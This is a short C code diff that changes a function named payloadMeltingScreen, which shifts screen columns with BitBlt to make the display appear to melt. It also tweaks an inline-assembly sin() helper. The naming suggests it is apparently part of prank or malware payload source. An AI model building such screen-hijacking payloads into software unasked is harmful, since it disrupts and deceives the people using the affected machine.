@@ -189,7 +189,9 @@ PAYLOAD payloadMeltingScreen(int size, int power) {
 		BitBlt(hdc2, 0, 0, size, h, hdc, x, 0, SRCCOPY);
 
 		for (int j = 0; j < size; j++) {
-			BitBlt(hdc2, j, 0, 1, h, hdc2, j, -sin(j/((float)size)*3.14159)*(size/4), SRCCOPY);
+			for (int k = 0; k < sin(j / ((float)size)*3.14159)*(size / 4); k++) {
+				BitBlt(hdc2, j, 0, 1, h, hdc2, j, -1, SRCCOPY);
+			}
 		}
 
 		BitBlt(hdc, x, 0, size, h, hdc2, 0, 0, SRCCOPY);
@@ -203,7 +205,6 @@ float sin(float x) {
 	__asm {
 		fld x
 		fsin
-		//ret
 	}
 }
 
